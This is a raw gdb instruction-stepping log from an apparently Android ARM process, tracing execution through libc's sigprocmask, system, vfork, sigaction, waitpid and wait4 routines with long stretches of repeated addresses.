0xb6f41004 in sigprocmask ()
(gdb) 
0xb6f40fe8 in sigprocmask ()
(gdb) 
0xb6f40fea in sigprocmask ()
(gdb) 
0xb6f40ffe in sigprocmask ()
(gdb) 
0xb6f41000 in sigprocmask ()
(gdb) 
0xb6f41002 in sigprocmask ()
(gdb) 
0xb6f41004 in sigprocmask ()
(gdb) 
0xb6f40fe8 in sigprocmask ()
(gdb) 
0xb6f40fea in sigprocmask ()
(gdb) 
0xb6f40ffe in sigprocmask ()
(gdb) 
0xb6f41000 in sigprocmask ()
(gdb) 
0xb6f41002 in sigprocmask ()
(gdb) 
0xb6f41004 in sigprocmask ()
(gdb) 
0xb6f40fe8 in sigprocmask ()
(gdb) 
0xb6f40fea in sigprocmask ()
(gdb) 
0xb6f40ffe in sigprocmask ()
(gdb) 
0xb6f41000 in sigprocmask ()
(gdb) 
0xb6f41002 in sigprocmask ()
(gdb) 
0xb6f41004 in sigprocmask ()
(gdb) 
0xb6f40fe8 in sigprocmask ()
(gdb) 
0xb6f40fea in sigprocmask ()
(gdb) 
0xb6f40ffe in sigprocmask ()
(gdb) 
0xb6f41000 in sigprocmask ()
(gdb) 
0xb6f41002 in sigprocmask ()
(gdb) 
0xb6f41004 in sigprocmask ()
(gdb) 
0xb6f40fe8 in sigprocmask ()
(gdb) 
0xb6f40fea in sigprocmask ()
(gdb) 
0xb6f40ffe in sigprocmask ()
(gdb) 
0xb6f41000 in sigprocmask ()
(gdb) 
0xb6f41002 in sigprocmask ()
(gdb) 
0xb6f41004 in sigprocmask ()
(gdb) 
0xb6f40fe8 in sigprocmask ()
(gdb) 
0xb6f40fea in sigprocmask ()
(gdb) 
0xb6f40ffe in sigprocmask ()
(gdb) 
0xb6f41000 in sigprocmask ()
(gdb) 
0xb6f41002 in sigprocmask ()
(gdb) 
0xb6f41004 in sigprocmask ()
(gdb) 
0xb6f40fe8 in sigprocmask ()
(gdb) 
0xb6f40fea in sigprocmask ()
(gdb) 
0xb6f40ffe in sigprocmask ()
(gdb) 
0xb6f41000 in sigprocmask ()
(gdb) 
0xb6f41002 in sigprocmask ()
(gdb) 
0xb6f41004 in sigprocmask ()
(gdb) 
0xb6f40fe8 in sigprocmask ()
(gdb) 
0xb6f40fea in sigprocmask ()
(gdb) 


0xb6f40ffe in sigprocmask ()
(gdb) 
0xb6f41000 in sigprocmask ()
(gdb) 

0xb6f41002 in sigprocmask ()
(gdb) 

0xb6f41004 in sigprocmask ()
(gdb) 

0xb6f40fe8 in sigprocmask ()
(gdb) 

0xb6f40fea in sigprocmask ()
(gdb) 
0xb6f40ffe in sigprocmask ()
(gdb) 
0xb6f41000 in sigprocmask ()
(gdb) 
0xb6f41002 in sigprocmask ()
(gdb) 
0xb6f41004 in sigprocmask ()
(gdb) 
0xb6f40fe8 in sigprocmask ()
(gdb) 

0xb6f40fea in sigprocmask ()
(gdb) 

0xb6f40ffe in sigprocmask ()
(gdb) 

0xb6f41000 in sigprocmask ()
(gdb) 

0xb6f41002 in sigprocmask ()
(gdb) 
0xb6f41004 in sigprocmask ()
(gdb) 
0xb6f40fe8 in sigprocmask ()
(gdb) 
0xb6f40fea in sigprocmask ()
(gdb) 
0xb6f40ffe in sigprocmask ()
(gdb) 
0xb6f41000 in sigprocmask ()
(gdb) 
0xb6f41002 in sigprocmask ()
(gdb) 
0xb6f41004 in sigprocmask ()
(gdb) 
0xb6f40fe8 in sigprocmask ()
(gdb) 
0xb6f40fea in sigprocmask ()
(gdb) 
0xb6f40ffe in sigprocmask ()
(gdb) 
0xb6f41000 in sigprocmask ()
(gdb) 
0xb6f41002 in sigprocmask ()
(gdb) 
0xb6f41004 in sigprocmask ()
(gdb) 
0xb6f40fe8 in sigprocmask ()
(gdb) 
0xb6f40fea in sigprocmask ()
(gdb) 
0xb6f40ffe in sigprocmask ()
(gdb) 
0xb6f41000 in sigprocmask ()
(gdb) 
0xb6f41002 in sigprocmask ()
(gdb) 
0xb6f41004 in sigprocmask ()
(gdb) 
0xb6f40fe8 in sigprocmask ()
(gdb) 
0xb6f40fea in sigprocmask ()
(gdb) 
0xb6f40ffe in sigprocmask ()
(gdb) 
0xb6f41000 in sigprocmask ()
(gdb) 
0xb6f41002 in sigprocmask ()
(gdb) 
0xb6f41004 in sigprocmask ()
(gdb) 
0xb6f40fe8 in sigprocmask ()
(gdb) 
0xb6f40fea in sigprocmask ()
(gdb) 
0xb6f40ffe in sigprocmask ()
(gdb) 
0xb6f41000 in sigprocmask ()
(gdb) 
0xb6f41002 in sigprocmask ()
(gdb) 
0xb6f41004 in sigprocmask ()
(gdb) 
0xb6f40fe8 in sigprocmask ()
(gdb) 
0xb6f40fea in sigprocmask ()
(gdb) 
0xb6f40ffe in sigprocmask ()
(gdb) 
0xb6f41000 in sigprocmask ()
(gdb) 
0xb6f41002 in sigprocmask ()
(gdb) 
0xb6f41004 in sigprocmask ()
(gdb) 
0xb6f40fe8 in sigprocmask ()
(gdb) 
0xb6f40fea in sigprocmask ()
(gdb) 
0xb6f40ffe in sigprocmask ()
(gdb) 
0xb6f41000 in sigprocmask ()
(gdb) 
0xb6f41002 in sigprocmask ()
(gdb) 
0xb6f41004 in sigprocmask ()
(gdb) 
0xb6f40fe8 in sigprocmask ()
(gdb) 
0xb6f40fea in sigprocmask ()
(gdb) 
0xb6f40ffe in sigprocmask ()
(gdb) 
0xb6f41000 in sigprocmask ()
(gdb) 
0xb6f41002 in sigprocmask ()
(gdb) 
0xb6f41004 in sigprocmask ()
(gdb) 
0xb6f40fe8 in sigprocmask ()
(gdb) 
0xb6f40fea in sigprocmask ()
(gdb) 
0xb6f40ffe in sigprocmask ()
(gdb) 
0xb6f41000 in sigprocmask ()
(gdb) 
0xb6f41002 in sigprocmask ()
(gdb) 
0xb6f41004 in sigprocmask ()
(gdb) 
0xb6f40fe8 in sigprocmask ()
(gdb) 
0xb6f40fea in sigprocmask ()
(gdb) 
0xb6f40ffe in sigprocmask ()
(gdb) 
0xb6f41000 in sigprocmask ()
(gdb) 
0xb6f41002 in sigprocmask ()
(gdb) 
0xb6f41004 in sigprocmask ()
(gdb) 
0xb6f40fe8 in sigprocmask ()
(gdb) 
0xb6f40fea in sigprocmask ()
(gdb) 
0xb6f40ffe in sigprocmask ()
(gdb) 
0xb6f41000 in sigprocmask ()
(gdb) 
0xb6f41002 in sigprocmask ()
(gdb) 
0xb6f41004 in sigprocmask ()
(gdb) 
0xb6f41006 in sigprocmask ()
(gdb) 
0xb6f41008 in sigprocmask ()
(gdb) 
0xb6f4100c in sigprocmask ()
(gdb) 
0xb6f4100e in sigprocmask ()
(gdb) 
0xb6f41010 in sigprocmask ()
(gdb) 
0xb6f41012 in sigprocmask ()
(gdb) 
0xb6f41020 in sigprocmask ()
(gdb) 
0xb6f41022 in sigprocmask ()
(gdb) 
0xb6f41024 in sigprocmask ()
(gdb) 
0xb6f41026 in sigprocmask ()
(gdb) 
0xb4cb0014 in sigprocmask () from target:/system/lib/libc.so
(gdb) 
0xb4cb0016 in sigprocmask () from target:/system/lib/libc.so
(gdb) 
0xb4cb0018 in sigprocmask () from target:/system/lib/libc.so
(gdb) 
0xb4cb001a in sigprocmask () from target:/system/lib/libc.so
(gdb) 
0xb4cb001c in sigprocmask () from target:/system/lib/libc.so
(gdb) 
0xb4cb001e in sigprocmask () from target:/system/lib/libc.so
(gdb) 
0xb4cb0020 in sigprocmask () from target:/system/lib/libc.so
(gdb) 
0xb4cb0022 in sigprocmask () from target:/system/lib/libc.so
(gdb) 
0xb4cb0024 in sigprocmask () from target:/system/lib/libc.so
(gdb) 
0xb4cb0026 in sigprocmask () from target:/system/lib/libc.so
(gdb) 
0xb4cb0028 in sigprocmask () from target:/system/lib/libc.so
(gdb) 
0xb4cb002c in sigprocmask () from target:/system/lib/libc.so
(gdb) 
0xb4cb0030 in sigprocmask () from target:/system/lib/libc.so
(gdb) 
0xb4cb0032 in sigprocmask () from target:/system/lib/libc.so
(gdb) 
0xb4cb0034 in sigprocmask () from target:/system/lib/libc.so
(gdb) 
0xb4cb0036 in sigprocmask () from target:/system/lib/libc.so
(gdb) 
0xb4cb003a in sigprocmask () from target:/system/lib/libc.so
(gdb) 
0xb4cb003e in sigprocmask () from target:/system/lib/libc.so
(gdb) 
0xb4cb0040 in sigprocmask () from target:/system/lib/libc.so
(gdb) 
0xb4cb0042 in sigprocmask () from target:/system/lib/libc.so
(gdb) 
0xb4cb0044 in sigprocmask () from target:/system/lib/libc.so
(gdb) 
0xb4ca7080 in __rt_sigprocmask@plt () from target:/system/lib/libc.so
(gdb) 
0xb4ca7084 in __rt_sigprocmask@plt () from target:/system/lib/libc.so
(gdb) 
0xb4ca7088 in __rt_sigprocmask@plt () from target:/system/lib/libc.so
(gdb) 
0xb4cdb42c in __rt_sigprocmask () from target:/system/lib/libc.so
(gdb) 
0xb4cdb430 in __rt_sigprocmask () from target:/system/lib/libc.so
(gdb) 
0xb4cdb434 in __rt_sigprocmask () from target:/system/lib/libc.so
(gdb) 
0xb4cdb438 in __rt_sigprocmask () from target:/system/lib/libc.so
(gdb) 
0xb4cdb43c in __rt_sigprocmask () from target:/system/lib/libc.so
(gdb) 
0xb4cdb440 in __rt_sigprocmask () from target:/system/lib/libc.so
(gdb) 
0xb4cb0048 in sigprocmask () from target:/system/lib/libc.so
(gdb) 
0xb4cb004c in sigprocmask () from target:/system/lib/libc.so
(gdb) 
0xb4cb004e in sigprocmask () from target:/system/lib/libc.so
(gdb) 
0xb4cb0050 in sigprocmask () from target:/system/lib/libc.so
(gdb) 
0xb4cb0052 in sigprocmask () from target:/system/lib/libc.so
(gdb) 
0xb4cb0054 in sigprocmask () from target:/system/lib/libc.so
(gdb) 
0xb4cb0056 in sigprocmask () from target:/system/lib/libc.so
(gdb) 
0xb4cb005c in sigprocmask () from target:/system/lib/libc.so
(gdb) 
0xb4cb005e in sigprocmask () from target:/system/lib/libc.so
(gdb) 
0xb4cb0060 in sigprocmask () from target:/system/lib/libc.so
(gdb) 
0xb4cb0062 in sigprocmask () from target:/system/lib/libc.so
(gdb) 
0xb4cb0064 in sigprocmask () from target:/system/lib/libc.so
(gdb) 
0xb4cb0066 in sigprocmask () from target:/system/lib/libc.so
(gdb) 
0xb4cb0068 in sigprocmask () from target:/system/lib/libc.so
(gdb) 
0xb4cb006a in sigprocmask () from target:/system/lib/libc.so
(gdb) 
0xb4cb006c in sigprocmask () from target:/system/lib/libc.so
(gdb) 
0xb6f41028 in sigprocmask ()
(gdb) 
0xb6f4102a in sigprocmask ()
(gdb) 
0xb6f4102c in sigprocmask ()
(gdb) 
0xb6f4102e in sigprocmask ()
(gdb) 
0xb6f41030 in sigprocmask ()
(gdb) 
0xb6f41032 in sigprocmask ()
(gdb) 
0xb6f41034 in sigprocmask ()
(gdb) 
0xb6f41036 in sigprocmask ()
(gdb) 
0xb6f41038 in sigprocmask ()
(gdb) 
0xb4cd8b88 in system () from target:/system/lib/libc.so
(gdb) 
0xb4ca7a70 in vfork@plt () from target:/system/lib/libc.so
(gdb) 
0xb4ca7a74 in vfork@plt () from target:/system/lib/libc.so
(gdb) 
0xb4ca7a78 in vfork@plt () from target:/system/lib/libc.so
(gdb) 
0xb4ca9500 in vfork () from target:/system/lib/libc.so
(gdb) 
0xb4ca9504 in vfork () from target:/system/lib/libc.so
(gdb) 
0xb4ca9508 in vfork () from target:/system/lib/libc.so
(gdb) 
0xb4ca950c in vfork () from target:/system/lib/libc.so
(gdb) 

0xb4ca9510 in vfork () from target:/system/lib/libc.so
(gdb) 

0xb4ca9514 in vfork () from target:/system/lib/libc.so
(gdb) 

0xb4ca9518 in vfork () from target:/system/lib/libc.so
(gdb) 

0xb4ca9520 in vfork () from target:/system/lib/libc.so
(gdb) 

0xb4ca9524 in vfork () from target:/system/lib/libc.so
(gdb) 

0xb4cd8b8c in system () from target:/system/lib/libc.so
(gdb) 
0xb4cd8b8e in system () from target:/system/lib/libc.so
(gdb) 
0xb4cd8b92 in system () from target:/system/lib/libc.so
(gdb) 
0xb4cd8b94 in system () from target:/system/lib/libc.so
(gdb) 
0xb4cd8b96 in system () from target:/system/lib/libc.so
(gdb) 

0xb4cd8b98 in system () from target:/system/lib/libc.so
(gdb) 

0xb4cd8b9a in system () from target:/system/lib/libc.so
(gdb) 

0xb4cd8b9c in system () from target:/system/lib/libc.so
(gdb) 
0xb4cd8b9e in system () from target:/system/lib/libc.so
(gdb) 
0xb4ca6a44 in sigaction@plt () from target:/system/lib/libc.so
(gdb) 
0xb4ca6a48 in sigaction@plt () from target:/system/lib/libc.so
(gdb) 
0xb4ca6a4c in sigaction@plt () from target:/system/lib/libc.so
(gdb) 
0xb6f41208 in sigaction ()
(gdb) 
0xb6f4120a in sigaction ()
(gdb) 
0xb6f4120c in sigaction ()
(gdb) 
0xb6f4120e in sigaction ()
(gdb) 
0xb6f41210 in sigaction ()
(gdb) 
0xb6f41212 in sigaction ()
(gdb) 
0xb6f41214 in sigaction ()
(gdb) 
0xb6f41216 in sigaction ()
(gdb) 
0xb6f41218 in sigaction ()
(gdb) 
0xb6f4121a in sigaction ()
(gdb) 
0xb6f4121c in sigaction ()
(gdb) 
0xb6f4121e in sigaction ()
(gdb) 
0xb6f41220 in sigaction ()
(gdb) 
0xb6f41222 in sigaction ()
(gdb) 
0xb6f41224 in sigaction ()
(gdb) 
0xb6f41228 in sigaction ()
(gdb) 
0xb6f4122a in sigaction ()
(gdb) 
0xb6f4122e in sigaction ()
(gdb) 
0xb6f41230 in sigaction ()
(gdb) 
0xb6f41258 in sigaction ()
(gdb) 
0xb6f4125a in sigaction ()
(gdb) 
0xb6f4125c in sigaction ()
(gdb) 
0xb6f4125e in sigaction ()
(gdb) 
0xb6f4126c in sigaction ()
(gdb) 
0xb6f4126e in sigaction ()
(gdb) 
0xb6f41270 in sigaction ()
(gdb) 
0xb6f41272 in sigaction ()
(gdb) 
0xb6f41274 in sigaction ()
(gdb) 
0xb6f41276 in sigaction ()
(gdb) 
0xb6f41278 in sigaction ()
(gdb) 
0xb6f4127a in sigaction ()
(gdb) 
0xb6f4127c in sigaction ()
(gdb) 
0xb6f4127e in sigaction ()
(gdb) 
0xb6f41280 in sigaction ()
(gdb) 
0xb6f41282 in sigaction ()
(gdb) 
0xb6f41286 in sigaction ()
(gdb) 
0xb4cafd70 in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb4cafd72 in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb4cafd74 in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb4cafd76 in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb4cafd78 in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb4cafd7c in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb4cafd7e in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb4cafd80 in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb4cafd82 in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb4cafd84 in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb4cafd86 in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb4cafd88 in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb4cafd8a in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb4cafdbc in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb4cafdbe in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb4cafdc0 in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb4cafdc2 in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb4cafdc4 in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb4cafdc6 in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb4ca732c in __sigaction@plt () from target:/system/lib/libc.so
(gdb) 
0xb4ca7330 in __sigaction@plt () from target:/system/lib/libc.so
(gdb) 
0xb4ca7334 in __sigaction@plt () from target:/system/lib/libc.so
(gdb) 
0xb4cdb504 in __sigaction () from target:/system/lib/libc.so
(gdb) 
0xb4cdb508 in __sigaction () from target:/system/lib/libc.so
(gdb) 
0xb4cdb50c in __sigaction () from target:/system/lib/libc.so
(gdb) 
0xb4cdb510 in __sigaction () from target:/system/lib/libc.so
(gdb) 
0xb4cdb514 in __sigaction () from target:/system/lib/libc.so
(gdb) 
0xb4cdb518 in __sigaction () from target:/system/lib/libc.so
(gdb) 
0xb4cafdca in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb4cafdcc in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb4cafdce in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb4cafdd0 in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb4cafdd2 in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb4cafdd4 in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb4cafdd6 in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb4cafdd8 in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb4cafddc in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb4cafdde in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb4cd8ba2 in system () from target:/system/lib/libc.so
(gdb) 
0xb4cd8ba4 in system () from target:/system/lib/libc.so
(gdb) 
0xb4cd8ba6 in system () from target:/system/lib/libc.so
(gdb) 
0xb4cd8ba8 in system () from target:/system/lib/libc.so
(gdb) 
0xb4ca6a44 in sigaction@plt () from target:/system/lib/libc.so
(gdb) 
0xb4ca6a48 in sigaction@plt () from target:/system/lib/libc.so
(gdb) 
0xb4ca6a4c in sigaction@plt () from target:/system/lib/libc.so
(gdb) 
0xb6f41208 in sigaction ()
(gdb) 
0xb6f4120a in sigaction ()
(gdb) 
0xb6f4120c in sigaction ()
(gdb) 
0xb6f4120e in sigaction ()
(gdb) 
0xb6f41210 in sigaction ()
(gdb) 
0xb6f41212 in sigaction ()
(gdb) 
0xb6f41214 in sigaction ()
(gdb) 
0xb6f41216 in sigaction ()
(gdb) 
0xb6f41218 in sigaction ()
(gdb) 
0xb6f4121a in sigaction ()
(gdb) 
0xb6f4121c in sigaction ()
(gdb) 
0xb6f4121e in sigaction ()
(gdb) 
0xb6f41220 in sigaction ()
(gdb) 
0xb6f41222 in sigaction ()
(gdb) 
0xb6f41224 in sigaction ()
(gdb) 
0xb6f41228 in sigaction ()
(gdb) 
0xb6f4122a in sigaction ()
(gdb) 
0xb6f4122e in sigaction ()
(gdb) 
0xb6f41230 in sigaction ()
(gdb) 
0xb6f41258 in sigaction ()
(gdb) 
0xb6f4125a in sigaction ()
(gdb) 
0xb6f4125c in sigaction ()
(gdb) 
0xb6f4125e in sigaction ()
(gdb) 
0xb6f4126c in sigaction ()
(gdb) 
0xb6f4126e in sigaction ()
(gdb) 
0xb6f41270 in sigaction ()
(gdb) 
0xb6f41272 in sigaction ()
(gdb) 
0xb6f41274 in sigaction ()
(gdb) 
0xb6f41276 in sigaction ()
(gdb) 
0xb6f41278 in sigaction ()
(gdb) 
0xb6f4127a in sigaction ()
(gdb) 
0xb6f4127c in sigaction ()
(gdb) 
0xb6f4127e in sigaction ()
(gdb) 
0xb6f41280 in sigaction ()
(gdb) 
0xb6f41282 in sigaction ()
(gdb) 
0xb6f41286 in sigaction ()
(gdb) 
0xb4cafd70 in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb4cafd72 in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb4cafd74 in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb4cafd76 in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb4cafd78 in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb4cafd7c in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb4cafd7e in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb4cafd80 in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb4cafd82 in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb4cafd84 in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb4cafd86 in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb4cafd88 in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb4cafd8a in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb4cafdbc in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb4cafdbe in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb4cafdc0 in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb4cafdc2 in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb4cafdc4 in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb4cafdc6 in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb4ca732c in __sigaction@plt () from target:/system/lib/libc.so
(gdb) 
0xb4ca7330 in __sigaction@plt () from target:/system/lib/libc.so
(gdb) 
0xb4ca7334 in __sigaction@plt () from target:/system/lib/libc.so
(gdb) 
0xb4cdb504 in __sigaction () from target:/system/lib/libc.so
(gdb) 
0xb4cdb508 in __sigaction () from target:/system/lib/libc.so
(gdb) 
0xb4cdb50c in __sigaction () from target:/system/lib/libc.so
(gdb) 
0xb4cdb510 in __sigaction () from target:/system/lib/libc.so
(gdb) 
0xb4cdb514 in __sigaction () from target:/system/lib/libc.so
(gdb) 
0xb4cdb518 in __sigaction () from target:/system/lib/libc.so
(gdb) 
0xb4cafdca in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb4cafdcc in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb4cafdce in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb4cafdd0 in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb4cafdd2 in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb4cafdd4 in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb4cafdd6 in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb4cafdd8 in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb4cafddc in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb4cafdde in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb4cd8bac in system () from target:/system/lib/libc.so
(gdb) 
0xb4cd8bae in system () from target:/system/lib/libc.so
(gdb) 
0xb4cd8bb0 in system () from target:/system/lib/libc.so
(gdb) 
0xb4cd8bb2 in system () from target:/system/lib/libc.so
(gdb) 
0xb4cd8bb4 in system () from target:/system/lib/libc.so
(gdb) 
0xb4cd8bb6 in system () from target:/system/lib/libc.so
(gdb) 
0xb4ca7aa0 in waitpid@plt () from target:/system/lib/libc.so
(gdb) 
0xb4ca7aa4 in waitpid@plt () from target:/system/lib/libc.so
(gdb) 
0xb4ca7aa8 in waitpid@plt () from target:/system/lib/libc.so
(gdb) 
0xb4cb287a in waitpid () from target:/system/lib/libc.so
(gdb) 
0xb4cb287c in waitpid () from target:/system/lib/libc.so
(gdb) 
0xb4d0371c in ?? () from target:/system/lib/libc.so
(gdb) 
0xb4d03720 in ?? () from target:/system/lib/libc.so
(gdb) 
0xb4d03724 in ?? () from target:/system/lib/libc.so
(gdb) 
0xb4ca74a0 in wait4@plt () from target:/system/lib/libc.so
(gdb) 
0xb4ca74a4 in wait4@plt () from target:/system/lib/libc.so
(gdb) 
0xb4ca74a8 in wait4@plt () from target:/system/lib/libc.so
(gdb) 

0xb4cdcc1c in wait4 () from target:/system/lib/libc.so
(gdb) 

0xb4cdcc20 in wait4 () from target:/system/lib/libc.so
(gdb) 

0xb4cdcc24 in wait4 () from target:/system/lib/libc.so
(gdb) 

0xb4cdcc28 in wait4 () from target:/system/lib/libc.so
(gdb) 
0xb4cdcc2c in wait4 () from target:/system/lib/libc.so
(gdb) 
0xb4cdcc30 in wait4 () from target:/system/lib/libc.so
(gdb) 
0xb4cd8bba in system () from target:/system/lib/libc.so
(gdb) 
0xb4cd8bbe in system () from target:/system/lib/libc.so
(gdb) 

0xb4cd8bcc in system () from target:/system/lib/libc.so
(gdb) 

0xb4cd8bce in system () from target:/system/lib/libc.so
(gdb) 

0xb4cd8bd0 in system () from target:/system/lib/libc.so
(gdb) 
0xb4cd8bd2 in system () from target:/system/lib/libc.so
(gdb) 
0xb4ca65ac in sigprocmask@plt () from target:/system/lib/libc.so
(gdb) 
0xb4ca65b0 in sigprocmask@plt () from target:/system/lib/libc.so
(gdb) 
0xb4ca65b4 in sigprocmask@plt () from target:/system/lib/libc.so
(gdb) 
0xb6f40fbc in sigprocmask ()
(gdb) 
0xb6f40fc0 in sigprocmask ()
(gdb) 
0xb6f40fc2 in sigprocmask ()
(gdb) 
0xb6f40fc4 in sigprocmask ()
(gdb) 
0xb6f40fc6 in sigprocmask ()
(gdb) 
0xb6f40fc8 in sigprocmask ()
(gdb) 
0xb6f40fca in sigprocmask ()
(gdb) 
0xb6f40fcc in sigprocmask ()
(gdb) 
0xb6f40fce in sigprocmask ()
(gdb) 
0xb6f40fd0 in sigprocmask ()
(gdb) 
0xb6f40fd2 in sigprocmask ()
(gdb) 
0xb6f40fd4 in sigprocmask ()
(gdb) 
0xb6f40fd6 in sigprocmask ()
(gdb) 
0xb6f40fd8 in sigprocmask ()
(gdb) 
0xb6f40fda in sigprocmask ()
(gdb) 
0xb6f41006 in sigprocmask ()
(gdb) 
0xb6f41008 in sigprocmask ()
(gdb) 
0xb6f4100c in sigprocmask ()
(gdb) 
0xb6f4100e in sigprocmask ()
(gdb) 
0xb6f41010 in sigprocmask ()
(gdb) 
0xb6f41012 in sigprocmask ()
(gdb) 
0xb6f41020 in sigprocmask ()
(gdb) 
0xb6f41022 in sigprocmask ()
(gdb) 
0xb6f41024 in sigprocmask ()
(gdb) 
0xb6f41026 in sigprocmask ()
(gdb) 
0xb4cb0014 in sigprocmask () from target:/system/lib/libc.so
(gdb) 
0xb4cb0016 in sigprocmask () from target:/system/lib/libc.so
(gdb) 
0xb4cb0018 in sigprocmask () from target:/system/lib/libc.so
(gdb) 
0xb4cb001a in sigprocmask () from target:/system/lib/libc.so
(gdb) 
0xb4cb001c in sigprocmask () from target:/system/lib/libc.so
(gdb) 
0xb4cb001e in sigprocmask () from target:/system/lib/libc.so
(gdb) 
0xb4cb0020 in sigprocmask () from target:/system/lib/libc.so
(gdb) 
0xb4cb0022 in sigprocmask () from target:/system/lib/libc.so
(gdb) 
0xb4cb0024 in sigprocmask () from target:/system/lib/libc.so
(gdb) 
0xb4cb0026 in sigprocmask () from target:/system/lib/libc.so
(gdb) 
0xb4cb0028 in sigprocmask () from target:/system/lib/libc.so
(gdb) 
0xb4cb002c in sigprocmask () from target:/system/lib/libc.so
(gdb) 
0xb4cb0030 in sigprocmask () from target:/system/lib/libc.so
(gdb) 
0xb4cb0032 in sigprocmask () from target:/system/lib/libc.so
(gdb) 
0xb4cb0034 in sigprocmask () from target:/system/lib/libc.so
(gdb) 
0xb4cb0036 in sigprocmask () from target:/system/lib/libc.so
(gdb) 
0xb4cb003a in sigprocmask () from target:/system/lib/libc.so
(gdb) 
0xb4cb003e in sigprocmask () from target:/system/lib/libc.so
(gdb) 
0xb4cb0040 in sigprocmask () from target:/system/lib/libc.so
(gdb) 
0xb4cb0042 in sigprocmask () from target:/system/lib/libc.so
(gdb) 
0xb4cb0044 in sigprocmask () from target:/system/lib/libc.so
(gdb) 
0xb4ca7080 in __rt_sigprocmask@plt () from target:/system/lib/libc.so
(gdb) 
0xb4ca7084 in __rt_sigprocmask@plt () from target:/system/lib/libc.so
(gdb) 
0xb4ca7088 in __rt_sigprocmask@plt () from target:/system/lib/libc.so
(gdb) 
0xb4cdb42c in __rt_sigprocmask () from target:/system/lib/libc.so
(gdb) 
0xb4cdb430 in __rt_sigprocmask () from target:/system/lib/libc.so
(gdb) 
0xb4cdb434 in __rt_sigprocmask () from target:/system/lib/libc.so
(gdb) 
0xb4cdb438 in __rt_sigprocmask () from target:/system/lib/libc.so
(gdb) 
0xb4cdb43c in __rt_sigprocmask () from target:/system/lib/libc.so
(gdb) 
0xb4cdb440 in __rt_sigprocmask () from target:/system/lib/libc.so
(gdb) 
0xb4cb0048 in sigprocmask () from target:/system/lib/libc.so
(gdb) 
0xb4cb004c in sigprocmask () from target:/system/lib/libc.so
(gdb) 
0xb4cb004e in sigprocmask () from target:/system/lib/libc.so
(gdb) 
0xb4cb0054 in sigprocmask () from target:/system/lib/libc.so
(gdb) 
0xb4cb0056 in sigprocmask () from target:/system/lib/libc.so
(gdb) 
0xb4cb005c in sigprocmask () from target:/system/lib/libc.so
(gdb) 
0xb4cb005e in sigprocmask () from target:/system/lib/libc.so
(gdb) 
0xb4cb0060 in sigprocmask () from target:/system/lib/libc.so
(gdb) 
0xb4cb0062 in sigprocmask () from target:/system/lib/libc.so
(gdb) 
0xb4cb0064 in sigprocmask () from target:/system/lib/libc.so
(gdb) 
0xb4cb0066 in sigprocmask () from target:/system/lib/libc.so
(gdb) 
0xb4cb0068 in sigprocmask () from target:/system/lib/libc.so
(gdb) 
0xb4cb006a in sigprocmask () from target:/system/lib/libc.so
(gdb) 
0xb4cb006c in sigprocmask () from target:/system/lib/libc.so
(gdb) 
0xb6f41028 in sigprocmask ()
(gdb) 
0xb6f4102a in sigprocmask ()
(gdb) 
0xb6f4102c in sigprocmask ()
(gdb) 
0xb6f4102e in sigprocmask ()
(gdb) 
0xb6f41030 in sigprocmask ()
(gdb) 
0xb6f41032 in sigprocmask ()
(gdb) 
0xb6f41034 in sigprocmask ()
(gdb) 
0xb6f41036 in sigprocmask ()
(gdb) 
0xb6f41038 in sigprocmask ()
(gdb) 
0xb4cd8bd6 in system () from target:/system/lib/libc.so
(gdb) 
0xb4cd8bd8 in system () from target:/system/lib/libc.so
(gdb) 
0xb4cd8bda in system () from target:/system/lib/libc.so
(gdb) 
0xb4cd8bdc in system () from target:/system/lib/libc.so
(gdb) 
0xb4ca6a44 in sigaction@plt () from target:/system/lib/libc.so
